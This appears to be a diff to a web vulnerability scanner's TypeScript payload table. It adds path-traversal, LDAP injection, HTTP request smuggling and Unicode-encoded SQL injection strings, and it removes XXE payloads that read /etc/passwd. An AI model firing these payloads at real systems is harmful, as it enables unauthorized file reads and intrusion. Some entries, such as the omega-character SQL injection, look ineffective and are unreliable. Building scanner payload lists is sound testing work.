@@ -94,14 +94,23 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "/etc/passwd",
       "../../../../../../../../etc/passwd",
       "..\\..\\..\\..\\windows\\win.ini",
-      "/proc/self/environ"
+      "/proc/self/environ",
+      "index.php%00.jpg"  // Null byte injection bypass
     ]
   },
-  "XML External Entity (XXE)": {
+  "LDAP Injection": {
     type: "ParamCheck",
     payloads: [
-      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-      "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/passwd'>]><data>&file;</data>"
+      "*)(|(uid=*))",
+      "*))(objectClass=*))(|(objectClass=*)",
+      "admin)(|(password=*))"
+    ]
+  },
+  "HTTP Request Smuggling": {
+    type: "ParamCheck",
+    payloads: [
+      "Transfer-Encoding: chunked\r\n0\r\n\r\nGARBAGE",
+      "0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com"
     ]
   },
   "Open Redirect": {
@@ -144,6 +153,14 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "%0d%0aSet-Cookie: malicious=true",
       "\r\nLocation: http://malicious.com",
       "%0d%0aContent-Length:0"
+    ]
+  },
+  "UTF8/Unicode Bypass": {
+    type: "ParamCheck",
+    payloads: [
+      "\\u0027 OR \\u00271\\u0027=\\u00271",  // Unicode encoded SQL injection
+      "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",  // UTF-8 encoded with fancy quotes
+      "Ω OR Ω=Ω"  // Using Unicode omega characters
     ]
   }
 };
